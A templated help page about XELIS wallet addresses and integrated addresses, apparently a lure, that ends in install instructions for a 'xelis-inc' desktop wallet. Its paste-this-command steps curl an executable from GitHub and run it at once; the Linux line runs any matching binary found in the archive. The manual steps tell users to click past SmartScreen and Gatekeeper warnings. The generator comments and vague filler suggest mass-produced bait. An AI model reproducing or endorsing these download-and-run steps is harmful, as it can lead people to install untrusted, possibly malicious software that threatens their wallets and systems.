![XELIS Wallet address format, QR and integrated address support](assets/banner-article.png)
# XELIS Wallet address format, QR and integrated address support

What an address identifies, when to use an integrated one and why pastes fail.

## Downloads - Addresses

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> An address is not secret, but a wrong one is irreversible. Nothing can recall a payment sent to an address you misread.

A XELIS address identifies a wallet and is what you share to be paid. An integrated address bundles extra payment data into the same string for cases that need a reference. Long addresses break in chat apps and terminals, so copy rather than retype, and compare the ends before confirming a send.

<!-- ARTICLE-BODY-BEGIN -->
## What an address is, and what it is not

An address is a public identifier for a wallet, derived from its keys, and every address you share comes from the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> rather than an old screenshot. It is safe to share, it can be reused, and it does not let anyone spend from it. It is also not a username: two addresses belong to two wallets, and nothing in the string tells you who owns either.

The exact encoding, prefix and length vary by product and by network, so this article does not describe a format it cannot verify. What matters practically is that the address came from the wallet itself, unmodified.

## Integrated addresses

An integrated address carries extra identifying data alongside the destination, so a sender can attach the reference a service expects without a separate memo field. It removes one failure mode in payments to services that demand a reference, and it changes nothing about who controls the funds.

Use the form the recipient asks for. If they ask for a plain address, send the plain one; an integrated address is not an upgrade, it is a different string for a different requirement.

## Why addresses get rejected

The common causes are a truncated paste, an address from another chain, or an exchange that expects a different address form or a memo. A chat app that shortens a long string with an ellipsis is the most frequent culprit, and it produces an error rather than a wrong payment, which is the good outcome.

When a send is refused, re-copy from the receive view instead of editing the string. The full paste-check procedure is in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md">paste an address in XELIS Wallet</a>.

The receive side, and how to share an address without truncating it, is in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md">receive XEL in XELIS Wallet</a>.

## Copying an address in a terminal

Selecting text in a terminal often fails because the selection is not enabled, and typing a long address by hand is not a plan. Use whatever copy mechanism the terminal offers, or take the address from a QR code with a scanner, then compare its beginning and end against the original.

Once an address is in a record, it is also the only identifier you have for the counterparty. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-history-records.md">XELIS Wallet transaction history</a> explains how to keep that record usable.

## FAQ
### What does a XELIS Wallet address look like?
A long alphanumeric string produced by the wallet. Share it exactly as shown; there is no shorter form to memorise.

### What is an integrated address?
An address that bundles extra payment data, used when a recipient needs a reference attached to the payment.

### Why is my XELIS Wallet address rejected by an exchange?
Usually the wrong address form, a required memo, or a truncated paste. Ask which form the exchange accepts.

### Can I reuse one address for many payments?
Yes. Reuse does not weaken the wallet; the transaction graph is public either way.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Receive XEL in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md)
- [Send XEL with XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-send-fee-confirmation.md)
- [XELIS Wallet transaction history](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-history-records.md)
- [XELIS Wallet privacy limits](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md)
